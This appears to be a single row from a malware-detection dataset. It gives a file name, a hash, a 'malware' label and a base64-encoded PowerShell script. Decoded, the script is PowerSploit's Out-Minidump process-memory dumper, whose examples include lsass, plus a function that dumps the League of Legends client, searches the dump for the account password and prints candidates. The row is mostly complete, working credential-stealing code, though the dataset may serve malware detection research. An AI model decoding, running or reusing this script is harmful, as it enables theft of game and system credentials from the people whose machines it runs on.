Extract-Lol.ps1,1f858735d85811da8dc54b396f4752cd,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gT3V0LU1pbmlkdW1wCnsKPCMKLlNZTk9QU0lTCgogICAgR2VuZXJhdGVzIGEgZnVsbC1tZW1vcnkgbWluaWR1bXAgb2YgYSBwcm9jZXNzLgoKICAgIFBvd2VyU3Bsb2l0IEZ1bmN0aW9uOiBPdXQtTWluaWR1bXAKICAgIEF1dGhvcjogTWF0dGhldyBHcmFlYmVyIChAbWF0dGlmZXN0YXRpb24pCiAgICBMaWNlbnNlOiBCU0QgMy1DbGF1c2UKICAgIFJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZQogICAgT3B0aW9uYWwgRGVwZW5kZW5jaWVzOiBOb25lCgouREVTQ1JJUFRJT04KCiAgICBPdXQtTWluaWR1bXAgd3JpdGVzIGEgcHJvY2VzcyBkdW1wIGZpbGUgd2l0aCBhbGwgcHJvY2VzcyBtZW1vcnkgdG8gZGlzay4KICAgIFRoaXMgaXMgc2ltaWxhciB0byBydW5uaW5nIHByb2NkdW1wLmV4ZSB3aXRoIHRoZSAnLW1hJyBzd2l0Y2guCgouUEFSQU1FVEVSIFByb2Nlc3MKCiAgICBTcGVjaWZpZXMgdGhlIHByb2Nlc3MgZm9yIHdoaWNoIGEgZHVtcCB3aWxsIGJlIGdlbmVyYXRlZC4gVGhlIHByb2Nlc3Mgb2JqZWN0CiAgICBpcyBvYnRhaW5lZCB3aXRoIEdldC1Qcm9jZXNzLgoKLlBBUkFNRVRFUiBEdW1wRmlsZVBhdGgKCiAgICBTcGVjaWZpZXMgdGhlIHBhdGggd2hlcmUgZHVtcCBmaWxlcyB3aWxsIGJlIHdyaXR0ZW4uIEJ5IGRlZmF1bHQsIGR1bXAgZmlsZXMKICAgIGFyZSB3cml0dGVuIHRvIHRoZSBjdXJyZW50IHdvcmtpbmcgZGlyZWN0b3J5LiBEdW1wIGZpbGUgbmFtZXMgdGFrZSBmb2xsb3dpbmcKICAgIGZvcm06IHByb2Nlc3NuYW1lX2lkLmRtcAoKLkVYQU1QTEUKCiAgICBPdXQtTWluaWR1bXAgLVByb2Nlc3MgKEdldC1Qcm9jZXNzIC1JZCA0MjkzKQoKICAgIERlc2NyaXB0aW9uCiAgICAtLS0tLS0tLS0tLQogICAgR2VuZXJhdGUgYSBtaW5pZHVtcCBmb3IgcHJvY2VzcyBJRCA0MjkzLgoKLkVYQU1QTEUKCiAgICBHZXQtUHJvY2VzcyBsc2FzcyB8IE91dC1NaW5pZHVtcAoKICAgIERlc2NyaXB0aW9uCiAgICAtLS0tLS0tLS0tLQogICAgR2VuZXJhdGUgYSBtaW5pZHVtcCBmb3IgdGhlIGxzYXNzIHByb2Nlc3MuIE5vdGU6IFRvIGR1bXAgbHNhc3MsIHlvdSBtdXN0IGJlCiAgICBydW5uaW5nIGZyb20gYW4gZWxldmF0ZWQgcHJvbXB0LgoKLkVYQU1QTEUKCiAgICBHZXQtUHJvY2VzcyB8IE91dC1NaW5pZHVtcCAtRHVtcEZpbGVQYXRoIEM6XHRlbXAKCiAgICBEZXNjcmlwdGlvbgogICAgLS0tLS0tLS0tLS0KICAgIEdlbmVyYXRlIGEgbWluaWR1bXAgb2YgYWxsIHJ1bm5pbmcgcHJvY2Vzc2VzIGFuZCBzYXZlIHRoZW0gdG8gQzpcdGVtcC4KCi5JTlBVVFMKCiAgICBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwoKICAgIFlvdSBjYW4gcGlwZSBhIHByb2Nlc3Mgb2JqZWN0IHRvIE91dC1NaW5pZHVtcC4KCi5PVVRQVVRTCgogICAgU3lzdGVtLklPLkZpbGVJbmZvCgouTElOSwoKICAgIGh0dHA6Ly93d3cuZXhwbG9pdC1tb25kYXkuY29tLwojPgoKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlKV0KICAgICAgICBbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NdCiAgICAgICAgJFByb2Nlc3MsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxKV0KICAgICAgICBbVmFsaWRhdGVTY3JpcHQoeyBUZXN0LVBhdGggJF8gfSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRHVtcEZpbGVQYXRoID0gJFBXRAogICAgKQoKICAgIEJFR0lOCiAgICB7CiAgICAgICAgJFdFUiA9IFtQU09iamVjdF0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5XaW5kb3dzRXJyb3JSZXBvcnRpbmcnKQogICAgICAgICRXRVJOYXRpdmVNZXRob2RzID0gJFdFUi5HZXROZXN0ZWRUeXBlKCdOYXRpdmVNZXRob2RzJywgJ05vblB1YmxpYycpCiAgICAgICAgJEZsYWdzID0gW1JlZmxlY3Rpb24uQmluZGluZ0ZsYWdzXSAnTm9uUHVibGljLCBTdGF0aWMnCiAgICAgICAgJE1pbmlEdW1wV3JpdGVEdW1wID0gJFdFUk5hdGl2ZU1ldGhvZHMuR2V0TWV0aG9kKCdNaW5pRHVtcFdyaXRlRHVtcCcsICRGbGFncykKICAgICAgICAkTWluaUR1bXBXaXRoRnVsbE1lbW9yeSA9IFtVSW50MzJdIDIKICAgIH0KCiAgICBQUk9DRVNTCiAgICB7CiAgICAgICAgJFByb2Nlc3NJZCA9ICRQcm9jZXNzLklkCiAgICAgICAgJFByb2Nlc3NOYW1lID0gJFByb2Nlc3MuTmFtZQogICAgICAgICRQcm9jZXNzSGFuZGxlID0gJFByb2Nlc3MuSGFuZGxlCiAgICAgICAgJFByb2Nlc3NGaWxlTmFtZSA9ICIkKCRQcm9jZXNzTmFtZSkuZG1wIgoKICAgICAgICAkUHJvY2Vzc0R1bXBQYXRoID0gSm9pbi1QYXRoICREdW1wRmlsZVBhdGggJFByb2Nlc3NGaWxlTmFtZQoKICAgICAgICAkRmlsZVN0cmVhbSA9IE5ldy1PYmplY3QgSU8uRmlsZVN0cmVhbSgkUHJvY2Vzc0R1bXBQYXRoLCBbSU8uRmlsZU1vZGVdOjpDcmVhdGUpCgogICAgICAgICRSZXN1bHQgPSAkTWluaUR1bXBXcml0ZUR1bXAuSW52b2tlKCRudWxsLCBAKCRQcm9jZXNzSGFuZGxlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRQcm9jZXNzSWQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZpbGVTdHJlYW0uU2FmZUZpbGVIYW5kbGUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1pbmlEdW1wV2l0aEZ1bGxNZW1vcnksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgW0ludFB0cl06Olplcm8sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgW0ludFB0cl06Olplcm8sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgW0ludFB0cl06Olplcm8pKQoKICAgICAgICAkRmlsZVN0cmVhbS5DbG9zZSgpCgogICAgICAgIGlmICgtbm90ICRSZXN1bHQpCiAgICAgICAgewogICAgICAgICAgICAkRXhjZXB0aW9uID0gTmV3LU9iamVjdCBDb21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbgogICAgICAgICAgICAkRXhjZXB0aW9uTWVzc2FnZSA9ICIkKCRFeGNlcHRpb24uTWVzc2FnZSkgKCQoJFByb2Nlc3NOYW1lKTokKCRQcm9jZXNzSWQpKSIKCiAgICAgICAgICAgICMgUmVtb3ZlIGFueSBwYXJ0aWFsbHkgd3JpdHRlbiBkdW1wIGZpbGVzLiBGb3IgZXhhbXBsZSwgYSBwYXJ0aWFsIGR1bXAgd2lsbCBiZSB3cml0dGVuCiAgICAgICAgICAgICMgaW4gdGhlIGNhc2Ugd2hlbiAzMi1iaXQgUG93ZXJTaGVsbCB0cmllcyB0byBkdW1wIGEgNjQtYml0IHByb2Nlc3MuCiAgICAgICAgICAgIFJlbW92ZS1JdGVtICRQcm9jZXNzRHVtcFBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKCiAgICAgICAgICAgIHRocm93ICRFeGNlcHRpb25NZXNzYWdlCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIEdldC1DaGlsZEl0ZW0gJFByb2Nlc3NEdW1wUGF0aAogICAgICAgIH0KICAgIH0KCiAgICBFTkQge30KfQoKZnVuY3Rpb24gRXh0cmFjdC1Mb2wKewo8IwouU1lOT1BTSVMKClRyaWVzIHRvIGV4dHJhY3QgdGhlIExlYWd1ZSBvZiBMZWdlbmRzIHBhc3N3b3JkIGZyb20gdGhlIExvbENsaWVudCBwcm9jZXNzJyBtZW1vcnkKCi5ERVNDUklQVElPTgoKSXQgd29uJ3Qgd29yayBtb3N0IGxpa2VseQoKCgouRVhBTVBMRQoKUFMgQzpcPkV4dHJhY3QtTG9sCgojPgogICAgICAgICAgICAgICAgICAgICAgICAKJHBhdHRlcm5zID0gKFtyZWdleF0gJ1x4NkNceDZGXHg2Q1x4NjNceDZDXHg2OVx4NjVceDZFXHg3NFx4MkVceDZDXHg2Rlx4NkNceDJFXHg3Mlx4NjlceDZGXHg3NFx4NjdceDYxXHg2RFx4NjVceDczXHgyRVx4NjNceDZGXHg2RCcsCiAgICAgICAgICAgICBbcmVnZXhdICdceDc0XHg2Rlx4NkJceDY1XHg2RVx4MTFceDcwXHg2MVx4NzNceDczXHg3N1x4NkZceDcyXHg2NFx4MURceDYxXHg2M1x4NjNceDZGXHg3NVx4NkVceDc0XHg1M1x4NzVceDZEXHg2RFx4NjEnKQoKZnVuY3Rpb24gU2VlaygkaW5GaWxlLCBbSW50MzJdICRidWZTaXplKXsKICAkc3RyZWFtID0gW1N5c3RlbS5JTy5GaWxlXTo6T3BlblJlYWQoJGluRmlsZSkKICAkY2h1bmtOdW0gPSAxCiAgJGJhcnIgPSBOZXctT2JqZWN0IGJ5dGVbXSAkYnVmU2l6ZQoKICB3aGlsZSggJGJ5dGVzUmVhZCA9ICRzdHJlYW0uUmVhZCgkYmFyciwwLCRidWZTaXplKSl7CiAgICBXcml0ZS1PdXRwdXQgIlNlZWtpbmcgdGhyb3VnaCBjaHVuayAkY2h1bmtOdW0iCiAgICAkQXJyYXlQdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpVbnNhZmVBZGRyT2ZQaW5uZWRBcnJheUVsZW1lbnQoJGJhcnIsIDApCiAgICAkUmF3U3RyaW5nID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJpbmdBbnNpKCRBcnJheVB0ciwgJGJhcnIuTGVuZ3RoKQogICAgJHEgPSAwCiAgICBGb3JFYWNoKCAkUmVnZXggaW4gJHBhdHRlcm5zICkgeyAKICAgICAgICAkcSArPSAxCiAgICAgICAgJFJlc3VsdHMgPSAkUmVnZXguTWF0Y2hlcygkUmF3U3RyaW5nKQoJICAgIGlmICgkUmVzdWx0cy5jb3VudCAtZ3QgMCkKCSAgICB7CiAgICAgICAgICAgICRsZW4gPSAkUmVzdWx0cy5jb3VudAogICAgICAgICAgICBmb3IoJGk9MDskaS1sdCRsZW47JGkrKyl7CiAgICAgICAgICAgICAgICAkbWF0Y2ggPSAkUmF3U3RyaW5nLnN1YnN0cmluZygkUmVzdWx0c1skaV0uSW5kZXggLSAyMjAwLCA0MjAwKSAjbm90IHN1cmUgYWJvdXQgYSBnb29kIHNlYXJjaCByYW5nZQogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJQYXR0ZXJuICRxIGZvdW5kOiIKICAgICAgICAgICAgICAgICRtYXRjaCAtcmVwbGFjZSAiW15ceDIwLVx4N0VdIiwgIi4iCiAgICAgICAgICAgICAgICAkUmVnZXggPSBbcmVnZXhdICdceDA2XHgxQlsgLX5dezYsMTZ9JwogICAgICAgICAgICAgICAgJHJlID0gJFJlZ2V4Lk1hdGNoZXMoJG1hdGNoKQogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICctLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJwogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJCZXN0IGd1ZXNzZXM6ICIKICAgICAgICAgICAgICAgIGZvcmVhY2goJHIgaW4gJHJlKSB7CiAgICAgICAgICAgICAgICAgICAgJHIuVmFsdWUgIC1yZXBsYWNlICJbXlx4MjAtXHg3RV0iLCAiIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgIyRtYXRjaC5TdWJzdHJpbmcoJHJlWzBdLkluZGV4LCAxNikgLXJlcGxhY2UgIlteXHgyMC1ceDdFXSIsICIiCiAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgYHIKICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCBgcgogICAgICAgICAgICB9CgkgICAgfQogICAgfQogICAgJGNodW5rTnVtICs9IDEKICB9CiAgJHN0cmVhbS5jbG9zZSgpCn0KJHByb2MgPSBHZXQtUHJvY2VzcyAtTmFtZSBMb2xDbGllbnQgCmlmICgkcHJvYykgewogICAgV3JpdGUtT3V0cHV0ICJXYWl0aW5nIGZvciBkdW1wIHRvIGJlIHdyaXR0ZW4gLi4uIgogICAgJGR1bXBmaWxlID0gT3V0LU1pbmlkdW1wIC1Qcm9jZXNzICRwcm9jIC1EdW1wRmlsZVBhdGggJGVudjp0ZW1wCiAgICAjU3RhcnQtU2xlZXAgLXNlY29uZHMgMTAKICAgIFdyaXRlLU91dHB1dCAiU2Vla2luZyB0aHJvdWdoIGR1bXAgLi4uIgogICAgU2VlayAkZHVtcGZpbGUgMTAwMDAwMDAwCiAgICBSZW1vdmUtSXRlbSAkZHVtcGZpbGUKICAgIFtnY106OmNvbGxlY3QoKSAjdHJ5IHRvIGZyZWUgdXAgYWxsIHRoYXQgbWVtIHNoaXp6bGUKfSBlbHNlIHsKICAgIFdyaXRlLU91dHB1dCAiQ291bGQgbm90IGZpbmQgTG9sQ2xpZW50IHByb2Nlc3MsIGlzIGl0IHJ1bm5pbmc/Igp9Cn0KCiNFeHRyYWN0LUxvbA==
